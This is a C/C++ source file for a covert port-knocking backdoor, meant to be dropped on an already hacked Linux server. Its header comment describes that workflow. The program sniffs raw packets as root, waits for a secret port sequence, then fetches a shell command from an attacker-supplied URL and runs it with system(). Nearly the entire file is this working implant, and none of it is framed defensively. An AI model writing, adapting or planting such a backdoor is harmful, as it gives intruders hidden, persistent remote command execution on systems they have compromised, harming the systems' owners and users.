/*
Workflow of the attack: You have already hacked into the server, so you are going to drop a backdoor.
The backdoor will run forever, listening passively for incoming packets.
When the right sequence of packets arrive, it will reach out to a web server to fetch a linux command and execute it locally.

Command execution syntax: backdoor <path-to-config-file> <URL> 

The configuration file will contain the port sequence (one number per line). 
After the program has received the correct packets in the correct order that match the port-knocking sequence 
it should make a request to the URL parameter, fetch a linux command and execute it in the local system.

Note: run the program as root to get access to raw sockets.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netpacket/packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <vector>
#include <map>

std::vector<__u16> port_knocking_seq;

struct client_req {
	__u32 sip, dip;
	__u16 sport;
	bool operator < (const client_req &a) const { return sip < a.sip || dip < a.dip || sport < a.sport; }
};

std::map<client_req, int> client_req_state;

char urlHost[500];
char urlPage[500];
unsigned int urlPort = 80;

void ProcessPacket(unsigned char* , int);
void activate_backdoor();

int main(int argv, char** argc) {

	FILE *config_file; 
	int sock_raw, packet_size;
	__u16 port_num;
	char *url;
         
    	unsigned char *buffer = (unsigned char *) malloc(65536); //Its Big!
     
	// parse the config file   	
	config_file = fopen(argc[1],"r");
    	if(config_file == NULL) {
        	printf("Unable to open config file.\n");
		return -1;
    	}

	while (fscanf(config_file, "%hu", &port_num) == 1) {
		//printf("%d\n", port_num);
		port_knocking_seq.push_back(port_num);
	}
	fclose(config_file);

	// parse the URL
	url = argc[2];

	if (sscanf(url, "http://%99[^:]:%i/%199[^\n]", urlHost, &urlPort, urlPage) == 3);
		else if (sscanf(url, "http://%99[^/]/%199[^\n]", urlHost, urlPage) == 2);
			else if (sscanf(url, "http://%99[^:]:%i[^\n]", urlHost, &urlPort) == 2);
				else sscanf(url, "http://%99[^\n]", urlHost);
     
    	//printf("host:%s port:%u page:%s\n", urlHost, urlPort, urlPage);

	/*
	We Need to use raw sockets for this program. 
	Stream sockets and data gram sockets receive data from the transport layer that contains no headers but only the payload. 
	This means that there is no information about the source IP address and port numbers. 
	If applications running on the same machine or on different machines are communicating, then they are only exchanging data.
	A raw socket allows an application to directly access lower level protocols, which means a raw socket receives un-extracted packets. 
	There is no need to provide the port and IP address to a raw socket.
	*/

	sock_raw=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	//sock_raw = socket(AF_INET , SOCK_RAW , IPPROTO_UDP);
	if(sock_raw < 0) {
		printf("error in socket\n");
		return -1;
	}

	while(1) {
        	//Receive a packet
        	packet_size = recvfrom(sock_raw , buffer , 65536 , 0 , NULL, 0);
        	if(packet_size < 0 ) {
            		printf("Recvfrom error , failed to get packets\n");
            		return -1;
        	}
        
        	//Now process the packet
        	ProcessPacket(buffer, packet_size);

	}
	close(sock_raw);	
	return 0;
}

/*
For each client request, we are storing the next expected destination port in the sequence.
After the first knock, we add the client request to the map.
For every subsequent knock we update the index of the next expected dport 
by looking up the port knocking sequence.
*/
void ProcessPacket(unsigned char* buffer, int size) {
	struct client_req req;
	struct iphdr *iph;
	struct udphdr *udph;
	struct tcphdr *tcph;
	unsigned short iphdrlen;
	__u16 dest_port;
	std::map<client_req, int>::iterator next_port_index;

	//Get the IP Header
	iph = (struct iphdr*)(buffer +  sizeof(struct ethhdr));
	//iph = (struct iphdr*)buffer;

	iphdrlen = iph->ihl*4;
	req.sip = iph->saddr;
	req.dip = iph->daddr;
	
	//printf("\nSource IP        : %d\n", req.sip);
	//printf("Destination IP   : %d\n", req.dip);
	
	if(iph->protocol == IPPROTO_UDP) {
		//Get the UDP Header
		udph = (struct udphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
		//udph = (struct udphdr*)(buffer + iphdrlen);
		
		req.sport = ntohs(udph->source);
		dest_port = ntohs(udph->dest);
	} else if(iph->protocol == IPPROTO_TCP) {
		//Get the UDP Header
		tcph = (struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
		//tcph = (struct tcphdr*)(buffer + iphdrlen);
		
		req.sport = ntohs(tcph->source);
		dest_port = ntohs(tcph->dest);
	} else {
		//printf("unknown transport layer protocol\n");
		return;
	}

	//printf("Source Port      : %d\n", req.sport);
	//printf("Destination Port : %d\n", dest_port);
	
	next_port_index = client_req_state.find(req);
	if(next_port_index == client_req_state.end()) {   // first packet

		if(dest_port == port_knocking_seq[0]) { // dport in sequence

			//printf("found match for 1st port in the sequence\n");
			
			if(port_knocking_seq.size() == 1)
				activate_backdoor();
			else
				client_req_state[req] = 1;  
		} 
	} else {
		if(dest_port == port_knocking_seq[next_port_index->second]) { // dport in sequence

			if(port_knocking_seq.size() - 1 == next_port_index->second) {

				activate_backdoor();
				client_req_state[req] = 0;

			} else	{

				client_req_state[req]++;
				//printf("port sequence correct so far\n");
				//printf("index of next dport %d\n", client_req_state[req]);
				//printf("Next expected dport: %hu\n", port_knocking_seq[client_req_state[req]]);

			}   
		} else { // dport not in sequence, reset

			client_req_state[req] = 0;
			//printf("port sequence broken, reset\n");

		} 
	}
}

void activate_backdoor() {
	//printf("backdoor activated\n");

	int tcpSocket;
	struct hostent *server;
	struct sockaddr_in server_addr;
	char request[1000];
	char *httpbody = NULL;

	tcpSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (tcpSocket < 0) {
		printf("Error opening socket\n");
		return;
	}
	
	/* lookup the ip address */
	server = gethostbyname(urlHost);
	if (server == NULL) {
		printf("gethostbyname() failed\n");
		return;
	} 

	/* fill in the server_addr structure */
	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
	server_addr.sin_port = htons(urlPort);
	
	//printf("target ip:%s %s\n", inet_ntoa(*(struct in_addr*)server->h_addr), inet_ntoa(server_addr.sin_addr));

	if (connect(tcpSocket, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
		printf("Error Connecting\n");
		close(tcpSocket);
		return;
	} //else
		//printf("Successfully Connected\n");

	/* fill in the parameters for a GET request*/
	sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s\r\n\r\n", urlPage, urlHost);

	//printf("%s\n", request);

	if (send(tcpSocket, request, strlen(request), 0) < 0) {
		printf("Error with send()\n");
		close(tcpSocket);
		return;
	}

	bzero(request, 1000);

	recv(tcpSocket, request, 999, 0);
	//printf("Reply received:%s\n\n", request);

	httpbody = strstr(request, "\r\n\r\n");
	if (httpbody == NULL) {
		printf("HTTP response headers are not correctly formatted\n");
		return;
	}
 
	httpbody += 4; // move ahead 4 chars
	system(httpbody);

    	close(tcpSocket);
}
